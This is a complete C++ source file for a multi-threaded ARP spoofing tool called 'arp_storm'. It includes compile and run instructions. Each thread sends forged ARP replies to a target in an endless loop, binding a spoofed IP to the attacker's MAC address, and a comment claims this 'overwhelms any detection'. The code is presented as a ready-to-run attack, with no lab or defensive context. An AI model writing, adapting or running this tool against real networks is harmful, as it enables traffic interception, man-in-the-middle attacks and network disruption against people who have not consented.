// Compile: g++ -o arp_storm arp_storm.cpp -lpthread
// Run: sudo ./arp_storm <target_ip> <target_mac> <spoof_ip> <attacker_mac> <iface> <threads>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <vector>
#include <atomic>

class ARPStorm {
private:
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
    void stormThread(const std::string& targetIP, const std::string& targetMAC,
                     const std::string& spoofIP, const std::string& attackerMAC) {
        int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
        
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(targetMAC, eth->ether_dhost);
        macToBytes(attackerMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(attackerMAC, arp->arp_sha);
        inet_pton(AF_INET, spoofIP.c_str(), arp->arp_spa);
        macToBytes(targetMAC, arp->arp_tha);
        inet_pton(AF_INET, targetIP.c_str(), arp->arp_tpa);
        
        memset(sll.sll_addr, 0, 8);
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        sll.sll_halen = 6;
        
        while (true) {
            sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
        }
        
        close(sock);
    }
    
public:
    ARPStorm(const std::string& i) : iface(i) {}
    
    // Multi-threaded ARP storm - overwhelms any detection
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& spoofIP, const std::string& attackerMAC,
             int numThreads) {
        std::cout << "[*] ARP storm with " << numThreads << " threads\n";
        
        std::vector<std::thread> threads;
        for (int i = 0; i < numThreads; i++) {
            threads.emplace_back(&ARPStorm::stormThread, this,
                                targetIP, targetMAC, spoofIP, attackerMAC);
        }
        
        for (auto& t : threads) t.join();
    }
};

int main(int argc, char* argv[]) {
    if (argc != 7) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <spoof_ip> <attacker_mac> <iface> <threads>\n";
        return 1;
    }
    ARPStorm storm(argv[5]);
    storm.run(argv[1], argv[2], argv[3], argv[4], atoi(argv[6]));
    return 0;
}
